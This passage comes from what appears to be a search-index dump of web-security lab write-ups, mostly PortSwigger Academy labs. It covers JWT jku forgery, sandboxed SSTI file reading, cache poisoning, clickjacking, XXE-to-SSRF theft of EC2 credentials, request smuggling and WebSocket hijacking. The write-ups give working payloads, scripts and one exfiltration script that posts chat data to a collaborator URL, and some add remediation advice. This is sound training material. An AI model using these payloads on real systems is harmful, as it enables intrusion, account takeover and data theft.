    "type": "html"
  },
  {
    "objectID": "1fdd5c4bda2cd639937b370af8e462ee",
    "u": "https://webapp.tymyrddin.dev/docs/jwt/5",
    "t": "JWT authentication bypass via jku header injection ",
    "c": "JWT authentication bypass via jku header injection  Description  This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key. Reproduction and proof of concept  Upload a malicious JWK Set  In Burp, load the JWT Editor extension from the BApp store. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user. Go to the JWT Editor Keys tab in Burp’s main tab bar. Click New RSA Key . In the dialog, click Generate to automatically generate a new key pair, then click OK to save the key. Note that you don’t need to select a key size as this will automatically be updated later. { \"p\": \"6U8QUkjEgY_xfM0mVnsw-2XZCcXNRI6M-EAqyMJSgUN0AKp6TVwgrcloFj_7VSxHicbc6sXTpQW70iAax6U9wOJWkLhAMUDF_UQ8EeYENKPEakqVJEAOIicSZmB7wV_fYkSfnr64RljApyXSN4O_0kdWxWcgB5Tcuxw3lXqe1-s\", \"kty\": \"RSA\", \"q\": \"3HG-c-3y47tWuGIM8KIZY9gbiDXII8IKSCFVxPk7cRMrpueNDgp5-A18JuXWda4tBE1saXDFAaOXAyuAn9FdmseMxYrQkXzlK6u0j8rtzXzq8RVwgRtfXrosWzhoJJyH9cSBYo-tnX6077tgswmKOu-OviJBvyqmm6D3FrjsBB8\", \"d\": \"Tu2Gznhl1TPU1TaJcj8As6p79W2u3lAjJWv97HrtK-eRRbwm8O88dpeqtik1BBl1OiXTWv-08CTNCF9UBeG-_VsqZ0BaRtnppYeVlgzlGUlNm7-JhjTVXWitODzGopAEGt5SUUgTzau8-lVt1st69YG1_RNrGL7MuVX-B3akpicYTbJxWLzmATRyzeTz8yxAcLH1yXF8428hIlNw59ocplRavjF2mM4_VJxN11UfEBkyaDxm5UnFqSLkaDx5kkfzx56urPCpvsnWq78zFV-k2avEd1R_10API90iU3hbximcEhmBtCJHIPq3JPiU6iShML3Nkg7o6rcb4VfjCcIdBQ\", \"e\": \"AQAB\", \"kid\": \"8af37de4-0f37-4997-be5f-8260eb1a7f6b\", \"qi\": \"I9Lj-UdZ_khdA9YPNYlBOQK84qRL7wYVUw2ZVAK6jdKKX2Eqsr7okHPg6uaAGlxex0F9ZunVK2BnfK-ETpkNkrA_6GOyHJj3Ui35YTkDaHQy6FEaX2DIkTsBtVC2TZ2Q50Yl7wFoVowd7krE0rM_nCGl5DcT7JWnYqfSB4JpNKM\", \"dp\": \"SWN0Z9256mNj-_TwNU3k939vCRLuYb1RfJl6m9H8b-rO55K4i_MJ2IC9PBp-LamTCzTBsxvtWkB2dz9gDSLeTPklb7p1fsi4PtWi66Jl-kT1eNXjGhcIGxgdQpTg-M_2jYu2hhHKF169oxZTjODlivijw86PlbLux_C1T1DV_Gc\", \"dq\": \"m_g6WUnVHX2x-Nke8K6wKi2AJVpwFaS3o5s6VRhGD1YR_5A7A-EztObNnbPmjfLDVRT2jI_GQ8ecFBkWc30trlJb7nSt5xIoD0L4iPh6UnZ8wEB8DkzwqFQvCAeb37OEmsYDCVpA63r3x9qaq3InhFV0eGBChmBF6zzzNfd2vd8\", \"n\": \"yOebf0BX83Le6RNJLXkvAbtezgNxdV259TGE5EH_XzXunOSxjSQtHoQdSkND-QZYyUZXU6kE0iF6wcBFGGhUYu73JR_XqeV1F5ElzypMcV99mWulBRWaByjIOC1ocZMISo5f02Zpq7MReGwuN4Ow-80B_IiyYJqvu3XyRfwfliwN4wnioeIq4Woc94SCgTBbiGRVUzke59KWIg1gmEHg4g2VhQFt0VbyqrYq_QX8lHrN3gau1vtkvTHq6ZlBK7ZQWrKHuWOw_MMbZBJi1nyvKs2VsPJwHEJsuY5ID6e02nFKA2XJxYOK2GHp4UQJaXXfkfvCWsOxoCnPEpHWST_RdQ\" } In the browser, go to the exploit server. Replace the contents of the Body section with an empty JWK Set : { \"keys\": [ ] } Back on the JWT Editor Keys tab, right-click on the entry for the key that you just generated, then select Copy Public Key as JWK . Paste the JWK into the keys array on the exploit server, then store the exploit. The result should look something like this: Modify and sign the JWT  Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token message editor tab. In the header of the JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server. Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server. { \"kid\": \"8af37de4-0f37-4997-be5f-8260eb1a7f6b\", \"alg\": \"RS256\", \"jku\": \"https://exploit-0a7b002e04e9fa4dc1f30ce501ad00df.exploit-server.net/.well-known/jwks.json\" } In the payload, change the value of the sub claim to administrator . { \"iss\": \"portswigger\", \"sub\": \"administrator\", \"exp\": 1677593837 } At the bottom of the tab, click Sign , then select the RSA key that you generated in the previous section. Make sure that the Don't modify header option is selected, then click OK . The modified token is now signed with the correct signature. Send the request. Observe that you have successfully accessed the admin panel. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ). Send the request to this endpoint to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; forge a JWT that gives access to the admin panel at /admin ; then delete the user carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a0987e99494ca4d73edb19b99502e103",
    "u": "https://webapp.tymyrddin.dev/docs/ssti/6",
    "t": "Server-side template injection in a sandboxed environment ",
    "c": "Server-side template injection in a sandboxed environment  Description  This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. Reproduction and proof of concept  Log in with content-manager:C0nt3ntM4n4g3r and edit one of the product description templates. Notice that you have access to the product object. Load the JavaDoc for the Object class to find methods that should be available on all objects. Confirm that you can execute ${object.getClass()} using the product object. Explore the documentation to find a sequence of method invocations that grant access to a class with a static method that lets you read a file, such as: ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(\" \")} Enter this payload in one of the templates and save. The output will contain the contents of the file as decimal ASCII code points. 112 98 103 120 118 53 110 109 104 54 51 48 112 107 103 113 100 100 107 107 Convert the returned bytes to ASCII . pbgxv5nmh630pkgqddkk Click the Submit solution button and submit this string to solve the lab. Exploitability  An attacker will need to break out of the sandbox to read the file my_password.txt from Carlos’s home directory. Then submit the contents of the file.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "808ae68c3ce5875b25f7eb4b9b8e08b7",
    "u": "https://webapp.tymyrddin.dev/docs/cache/1",
    "t": "Web cache poisoning with an unkeyed header ",
    "c": "Web cache poisoning with an unkeyed header  Description  This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site’s home page. Reproduction and proof of concept  With Burp running, load the website’s home page In Burp, go to Proxy” -> “HTTP history and study the requests and responses generated. Find the GET request for the home page and send it to Burp Repeater. Add a cache-buster query parameter, such as ?cb=1234 . Add the X-Forwarded-Host header with an arbitrary hostname, such as example.com , and send the request. Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at /resources/js/tracking.js . Replay the request and observe that the response contains the header X-Cache: hit . This tells us that the response came from the cache. Go to the exploit server and change the file name to match the path used by the vulnerable response: /resources/js/tracking.js In the body, enter the payload alert(document.cookie) and store the exploit. Open the GET request for the home page in Burp Repeater and remove the cache buster. Add the following header, remembering to enter your own exploit server ID: X-Forwarded-Host: your-exploit-server-id.web-security-academy.net Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers. To simulate the victim, load the poisoned URL in your browser and make sure that the alert() is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds. If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved. Exploitability  An attacker will need to poison the cache with a response that executes alert(document.cookie) in the visitor’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c628ec50f17b1bdd737f0ad1d9c59b21",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Why?  The fast, easy, and very affordable way to test hacking skills. How?  Insecure Code Management Directory traversal File upload: null byte PHP assert() PHP Filters PHP Register globals JWT Introduction JWT (not) revoked token JWT weak secret Command injection: filter bypass Java: Server-side Template Injection (SSTI) Local file inclusion Local file inclusion: double encoding PHP preg_replace PHP type juggling SQL injection: authentication SQL injection: string XSLT code execution PHP path truncation PHP serialisation SQL injection: numeric SQL injection: routed SQL truncation XPath injection: authentication SQL injection: time-based",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e2f7d6e28fc0d181784dc480c8e89c6b",
    "u": "https://webapp.tymyrddin.dev/docs/acl/11",
    "t": "Method-based access control can be circumvented ",
    "c": "Method-based access control can be circumvented  Description  This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin . Reproduction and proof of concept  Log in using the admin credentials administrator:admin . Browse to the admin panel, promote carlos , and send the HTTP request to Burp Repeater. Open a private/incognito browser window, and log in with the non-admin credentials wiener:peter . Attempt to re-promote carlos with the non-admin user by copying that user’s session cookie into the existing Burp Repeater request, and observe that the response says “Unauthorized”. Change the method from POST to POSTX and observe that the response changes to “missing parameter”. Convert the request to use the GET method by right-clicking and selecting “Change request method”. Change the username parameter to your username and resend the request. Exploitability  An attacker will need to exploit the flawed access controls to become an administrator.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f53bb3cb749aa1788157cf277bf62afd",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/headers",
    "t": "HTTP Host header attacks ",
    "c": "HTTP Host header attacks  HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behaviour. Steps  Intercept the Request in Burp, and modify the Host header to an arbitrary value. When the site being tested is configured as the web server’s default or fallback option, the page will display when given an improper Host header. When multiple websites are being hosted by the same web server or front-end, the response is an error. Check for flawed validation Send ambiguous requests to bypass front-end systems Inject Host Override headers Brute-Force Virtual Hosts Flawed validation  Instead of returning an Invalid Host Header response, the request may be blocked as a security measure. The server may still be vulnerable. Try some bypasses: Insert the payload within the port field. The domain name may be checked, but the port number may not be. Provide an arbitrary domain name containing the whitelisted domain name. Validation may simply check if the target domain is present in the response. Ambiguous requests to bypass front-end systems  If a load balancer or CDN is in place acting as the front-end server, it may be possible to bypass security checks using one request, and have the application process the request on the back-end differently. Insert duplicate Host headers Try an absolute URL Add line wrapping with space character Inject Host Override headers  If it is not possible to override the Host Header using one of the techniques mentioned above, try injecting the payload into a header that will override it: X-Host X-Forwarded-Server X-HTTP-Host-Override Forwarded Brute-Forcing virtual hosts  If publicly accessible websites and private, internal sites are hosted on the same server, the internal hostname may resolve to a private IP address. Guess the hostnames. Try to discover a possibly hidden domain name through other means. Use Burp Intruder to brute-force virtual hosts using a simple wordlist of candidate subdomains. Escalation  If the Host header value is used to build a URL for password reset links. If so, password reset poisoning attacks are possible. Password reset functionality abuse is the most common use of Host header attacks. If the application uses the Host header to build script URLs, attackers can use malicious Host headers for web cache poisoning . This can affect any vulnerable caching mechanisms between the client and the server, including a caching proxy run by the site itself, downstream providers, content delivery networks (CDNs), and syndicators. Once poisoned, the cache then serves malicious content to anyone who requests it, allowing for very effective persistent cross-site scripting (XSS) attacks. If the application uses Host header values to construct SQL queries, it may be vulnerable to SQL injection via the Host header. If it uses Host header values to construct operating system commands, it may be vulnerable to OS command injection . The same applies to other types of server-side vulnerabilities caused by the application accepting user input from the Host header without validation. If the web server hosts other internal applications, Host header manipulation may allow attackers to access systems and functionality only accessible from the intranet or to local users, such as administrative panels. If local user authentication is based on the hostname, this opens up yet another attack vector. Manipulated Host headers can also open the way for attacks such as server-side request forgery (SSRF) . A typical scenario involves load-balancing system misconfigurations where the Host header is used to direct traffic to other sites on a local network. Header manipulation can then allow for specifying sites that should not be accessible from the outside. Portswigger lab writeups  Basic password reset poisoning Host header authentication bypass Web cache poisoning via ambiguous requests Routing-based SSRF SSRF via flawed request parsing Host validation bypass via connection state attack Password reset poisoning via dangling markup Remediation  Protect absolute URLs. Specify the current domain in a configuration file and refer to this value instead of the Host header. Use $_SERVER['SERVER_NAME'] and enforce it at the httpd (Apache, nginx, etc.) configuration level. Have an explicitly configured virtual host for each domain served. Do not allow “catch-all” configurations. When using a web application framework, use the hostname value stored by the framework. Frameworks ask for the hostname during setup and store that value securely in a configuration file. If your application needs the value of the Host header and there is no workaround, check it against a whitelist of permitted domains and reject or redirect any requests for unrecognised hosts. $domains = ['this.example.com', 'that.example2.org']; if ( ! in_array($_SERVER['SERVER_NAME'], $domains)) { // error } To prevent routing-based attacks on internal infrastructure, configure load balancers or any reverse proxies to forward requests only to a whitelist of permitted domains. Don’t support Host override headers, in particular X-Forwarded-Host. Avoid hosting internal-only websites and applications on the same server as public-facing content. Resources  Portswigger: HTTP Host header attacks OWASP: Testing for Host Header Injection",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e7821ee9d1b2ecec42186ce7819edffb",
    "u": "https://webapp.tymyrddin.dev/docs/clickjacking/3",
    "t": "Clickjacking with a frame buster script ",
    "c": "Clickjacking with a frame buster script  Description  This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address? To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on “Click me”. Reproduction and proof of concept  Log in to the account on the target website. Create payload: The iframe src URL points to the target website vulnerable page. In this case, the page containing the “Update email” form, and depends on the unique lab-ID. An initial opacity of 0.1 to align the iframe actions and adjust the position values. Initial top and left values of resp 385px and 80px - to align the “Update email” button with the “Test me” decoy action. <style> iframe { position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; } div { position:absolute; top: 385px; left: 80px; z-index: 1; } </style> <div>Test me</div> <iframe sandbox=\"allow-forms\" src=\"https://lab-id.web-security-academy.net/my-account?email=hacker@attacker-website.com\"></iframe> Go to the exploit server and paste the payload into the body field of the form. Click Store and then View exploit . Hover over “Test me” to make sure the cursor changes to a hand indicating that the div element is positioned correctly. If it is not, adjust the position of the div element by modifying the top and left properties of the style sheet. Change “Test me” to “Click me”, set opacity to 0.0001 , and click Store . Deliver exploit to victim Exploitability  An attacker needs to change another user’s email address by logging in to the wiener:peter account and crafting some HTML that frames the account page. Note: The victim will be using Chrome so test the exploit on that browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "47937f79134a3b54453b8da7e8e81c43",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/id",
    "t": "Insecure deserialisation ",
    "c": "Insecure deserialisation  Serialisation is the process by which some bit of data in a programming language gets converted into a format that allows it to be saved in a database or transferred over a network. Deserialisation refers to the opposite process, whereby the program reads the serialised object from a file or the network and converts it back into an object. Insecure deserialisation is a type of vulnerability that arises when an attacker can manipulate the serialised object to cause unintended consequences in the program. This can lead to authentication bypasses or even RCE . Steps  If you can get access to an application’s source code, search for deserialisation functions in source code that accept user input. If you cannot get access to source code, look for large blobs of data passed into an application. These could indicate serialised objects that are encoded. Alternatively, look for features that might have to deserialise objects supplied by the user, such as database inputs, authentication tokens, and HTML form parameters. If the serialised object contains information about the identity of the user, try tampering with the serialised object found and see if you can achieve authentication bypass. See if you can escalate the flaw into an SQL injection or remote code execution. Be extra careful not to cause damage to the target application or server. Draft report. Code review  Conducting a source code review is the most reliable way to detect deserialisation vulnerabilities. Other ways  It is also possible to find deserialisation vulnerabilities without examining any code. Begin by paying close attention to the large blobs of data passed into an application. Large data blobs could be serialised objects that represent object injection opportunities. If the data is encoded, try to decode it. Most encoded data passed into web applications is encoded with base64 . Alternatively, start by seeking out features that are prone to deserialisation flaws. Look for features that might have to deserialise objects supplied by the user, such as database inputs, authentication tokens, and HTML form parameters. Once you’ve found a user-supplied serialised object, you need to determine the type of serialised object it is. Is it a PHP object, a Python object, a Ruby object, or a Java object? Read each programming language’s documentation to familiarise yourself with the structure of its serialised objects. Automation  Ysoserial on Kali  Ysoserial is a PoC tool for generating payloads that exploit unsafe Java object deserialisation. Download the latest release jar from GitHub releases. Trying to use it you may get something like this: $ java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Error while generating or serializing payload java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x614635c2) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x614635c2 at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102) at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:32) at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:26) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) Java >=12 does not allow access to private fields of certain sensitive classes. $ java --version Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true openjdk 17.0.5 2022-10-18 OpenJDK Runtime Environment (build 17.0.5+8-Debian-2) OpenJDK 64-Bit Server VM (build 17.0.5+8-Debian-2, mixed mode, sharing) Changing to Java <= 12 . This will show all the JDK packages available for installation. sudo apt-cache search openjdk Installing 11 : sudo apt install openjdk-11-jdk To switch between Java versions, execute the following two commands while selecting the Java version 11 : sudo update-alternatives --config java sudo update-alternatives --config javac Test Java is now version 11 : $ java --version Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true openjdk 11.0.17 2022-10-18 OpenJDK Runtime Environment (build 11.0.17+8-post-Debian-2) OpenJDK 64-Bit Server VM (build 11.0.17+8-post-Debian-2, mixed mode, sharing) phpggc on kali  PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. It is available as kali tool . Escalation  Insecure deserialisation bugs often result in remote code execution , granting the attacker a wide range of capabilities with which to impact the application. And even when RCE is not possible, you might be able to achieve an authentication bypass or otherwise interfere with the logic flow of the application. The impact of insecure deserialisation can be limited when the vulnerability relies on an obscure point of entry, or requires a certain level of application privilege to exploit, or if the vulnerable function is not available to unauthenticated users. When escalating deserialisation flaws, take the scope and rules of the pentesting assessment or bounty program into account. Deserialisation vulnerabilities can be dangerous, so make sure you don’t cause damage to the target application when trying to manipulate program logic or execute arbitrary code. Portswigger lab writeups  Modifying serialised objects Modifying serialised data types Using application functionality to exploit insecure deserialisation Arbitrary object injection in PHP Exploiting Java deserialisation with Apache Commons Exploiting PHP deserialisation with a pre-built gadget chain Exploiting Ruby deserialisation using a documented gadget chain Developing a custom gadget chain for Java deserialisation Developing a custom gadget chain for PHP deserialisation Using PHAR deserialisation to deploy a custom gadget chain Remediation  Some frameworks do not allow deserialising objects of arbitrary type. These frameworks will check the type of the input object and refuse to run any code if the type is unexpected. For example, Jackson will not allow you to deserialise objects of random types unless you explicitly turn that behaviour on. If the serialisation library used allows arbitrary types and this behaviour can not be turned off, consider validating the types before deserialising. For example, supplement Java’s built-in deserialisation API with an open source library like Apache Commons IO. Java “recently” (in 2021) got equipped with native solutions to solve deserialisation issues. Upgrade to at least 17. Resources  Portswigger: Insecure deserialization OWASP: A8:2017-Insecure Deserialization New Java 17 features for improved security and serialization Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "eb410430b72e06216251d628619269c9",
    "u": "https://webapp.tymyrddin.dev/docs/headers/4",
    "t": "Routing-based SSRF ",
    "c": "Routing-based SSRF  Description  This lab is vulnerable to routing-based SSRF via the Host header. This can be exploited to access an insecure intranet admin panel located on an internal IP address. Reproduction  Send the GET / request that received a 200 response to Burp Repeater. In Burp Repeater, select the Host header value, right-click and select Insert Collaborator payload to replace it with a Collaborator domain name. Send the request. Go to the Collaborator tab and click Poll now . You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website’s middleware issue requests to an arbitrary server. Send the GET / request to Burp Intruder. In Burp Intruder, go to the Positions tab and clear the default payload positions. Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet: Host: 192.168.0.§0§ On the Payloads tab, select the payload type Numbers . Under Payload Options , enter the values: From: 0 To: 255 Step: 1 Click Start attack . A warning will inform you that the Host header does not match the specified target host. As we’ve done this deliberately, you can ignore this message. When the attack finishes, click the Status column to sort the results. Notice that a single request received a 302 response redirecting you to /admin . Send this request to Burp Repeater. In Burp Repeater, change the request line to GET /admin and send the request. In the response, observe that you have successfully accessed the admin panel. Study the form for deleting users. Notice that it will generate a POST request to /admin/delete with both a CSRF token and username parameter. You need to manually craft an equivalent request to delete Carlos. Change the path in your request to /admin/delete . Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos . The request line should now look like this but with a different CSRF token: GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request. Right-click on your request and select Change request method . Burp will convert it to a POST request. Send the request to delete Carlos and solve the lab. Exploitability  An attacker will need to access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator’s default public server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5d4783dd59d78c016d6917eedf875faf",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/2",
    "t": "Exploiting XXE to perform SSRF attacks ",
    "c": "Exploiting XXE to perform SSRF attacks  Description  This lab has a “Check stock” feature that parses XML input and returns any unexpected values in the response. The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/ . This endpoint can be used to retrieve data about the instance, some of which might be sensitive. Reproduction and proof of concept  Visit a product page, click “Check stock”, and intercept the resulting POST request in Burp Suite. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/\"> ]> Replace the productId number with a reference to the external entity: &xxe; . The response should contain “Invalid product ID:” followed by the response from the metadata endpoint, which will initially be a folder name. Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin . This should return JSON containing the SecretAccessKey . … Exploitability  An attacker needs to exploit the XXE vulnerability to perform an SSRF attack that obtains the server’s IAM secret access key from the EC2 metadata endpoint.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8ea5d4b85a59bbc72da2666c3a8c3442",
    "u": "https://webapp.tymyrddin.dev/docs/headers/3",
    "t": "Web cache poisoning via ambiguous requests ",
    "c": "Web cache poisoning via ambiguous requests  Description  This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site’s home page. Reproduction  Send the GET / request that received a 200 response to Burp Repeater and study the lab’s behaviour. Observe that the website validates the Host header. After tampering with it, you are unable to still access the home page. In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, GET /?cb=123 . You can simply change this parameter each time you want a fresh response from the back-end server. When adding a second Host header with an arbitrary value, this appears to be ignored when validating and routing the request. Crucially, the arbitrary value of the second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js . Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value. Go to the exploit server and create a file at /resources/js/tracking.js containing the payload alert(document.cookie) . Store the exploit and copy the domain name for your exploit server. Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request now looks something like this: GET /?cb=123 HTTP/1.1 Host: lab-id.web-security-academy.net Host: your exploit-server-id.web-security-academy.net Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in your browser using the same cache buster in the URL. Make sure that the alert() fires. In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page. PoC  Exploitability  An attacker will need to poison the cache so the home page executes alert(document.cookie) in the victim’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d5f2a8991919885c62dc9c5e30da2429",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/4",
    "t": "CSRF where token is not tied to user session ",
    "c": "CSRF where token is not tied to user session  Description  This lab ’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system. Reproduction and proof of concept  Open Burp’s browser and log in to the wiener victim account. Submit the “Update email” form, intercept the resulting request, and send it to the Repeater to check vulnerabilities: remove csrf token, change request method, change csrf token, and whether token is tied to user session. Make a note of the value of the CSRF token, then drop the request. Open a private/incognito browser window, log in to Portswigger, then on the lab site into the carlos attacker account, and copy its token (using Web Developer tools). Observe that if you swap the CSRF token with the value from the other account, then the request is accepted. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab (above). The CSRF tokens are single-use, so get a fresh one from the incognito window carlos account. Store the exploit, then click Deliver to victim . Exploitability  An attacker needs to use the exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. There are two accounts on the application that can be used to design the attack. The credentials are as follows, wiener:peter and carlos:montoya .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dc57058571127c5c0ffd3b412f410b9c",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/22",
    "t": "Server-side pause-based request smuggling ",
    "c": "Server-side pause-based request smuggling  Description  This lab is vulnerable to pause-based server-side request smuggling. The front-end server streams requests to the back-end, and the back-end server does not close the connection after a timeout on some endpoints. See Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling: Pause . Reproduction and proof of concept  Identify a desync vector  In Burp, notice from the Server response header that the lab is using Apache 2.4.52. This version of Apache is potentially vulnerable to pause-based CL.0 attacks on endpoints that trigger server-level redirects. In Burp Repeater, try issuing a request for a valid directory without including a trailing slash, for example, GET /resources . Observe that you are redirected to /resources/ . Right-click the request and select Extensions -> Turbo Intruder -> Send to Turbo Intruder . In Turbo Intruder, convert the request to a POST request (right-click and select Change request method). Change the Connection header to keep-alive . Add a complete GET /admin request to the body of the main request. The result should look something like this: POST /resources HTTP/1.1 Host: lab-id.web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: CORRECT GET /admin/ HTTP/1.1 Host: lab-id.web-security-academy.net In the Python editor panel, enter the following script. This issues the request twice, pausing for 61 seconds after the \\r\\n\\r\\n sequence at the end of the headers: def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=500, pipeline=False ) engine.queue(target.req, pauseMarker=['\\r\\n\\r\\n'], pauseTime=61000) engine.queue(target.req) def handleResponse(req, interesting): table.add(req) Launch the attack. Initially, you won’t see anything happening, but after 61 seconds, you should see two entries in the results table: The first entry is the POST /resources request, which triggered a redirect to /resources/ as normal. The second entry is a response to the GET /admin/ request. Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability. Exploit  In Turbo Intruder, go back to the attack configuration screen. In your smuggled request, change the Host header to localhost and relaunch the attack. After 61 seconds, notice that you have now successfully accessed the admin panel. Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details: The action attribute ( /admin/delete ). The name of the input ( username ). The csrf token. Go back to the attack configuration screen. Use these details to replicate the request that would be issued when submitting the form. The result should look something like this: POST /resources HTTP/1.1 Host: 0aff002604254014c2210d27007f0098.web-security-academy.net Cookie: session=4TP6Vc87hbPHTBC3t1NrkMur72FnhtII Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: CORRECT POST /admin/delete/ HTTP/1.1 Host: localhost Content-Type: x-www-form-urlencoded Content-Length: CORRECT csrf=eEtdwzBFbHWNIMY4LkkR5tSVtK1LYCPU&username=carlos To prevent Turbo Intruder from pausing after both occurrences of \\r\\n\\r\\n in the request, update the pauseMarker argument so that it only matches the end of the first set of headers, for example: pauseMarker=['Content-Length: CORRECT\\r\\n\\r\\n'] Launch the attack. After 61 seconds, the lab is solved. Exploitability  An attacker will need to identify a pause-based CL.0 desync vector; smuggle a request to the back-end to the admin panel at /admin ; and then delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c7fbcb75f9758e1750cf2f2b382b6dcb",
    "u": "https://webapp.tymyrddin.dev/docs/sockets/3",
    "t": "Cross-site WebSocket hijacking ",
    "c": "Cross-site WebSocket hijacking  Description  This online shop has a live chat feature implemented using WebSockets. Reproduction and proof of concept  Click “Live chat” and send a chat message. Reload the page. In Burp Proxy, in the WebSockets history tab, observe that the READY command retrieves past chat messages from the server. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens. Right-click on the handshake request and select Copy URL . In browser, go to the exploit server and paste this template into the Body section of the form: <script> var ws = new WebSocket('wss://0a18000803f6c281c1c86b78006d00ba.web-security-academy.net/chat'); ws.onopen = function() { ws.send(\"READY\"); }; ws.onmessage = function(event) { fetch('https://collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script> Replace the WebSocket URL with the URL from the WebSocket handshake ( lab-id.web-security-academy.net/chat ). Make sure to change the protocol from https:// to wss:// . Replace collaborator-url with a payload generated by Burp Collaborator Client. Mind the https:// remains in the URL. Store and click View exploit . Poll for interactions using Burp Collaborator client. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order. Go back to the 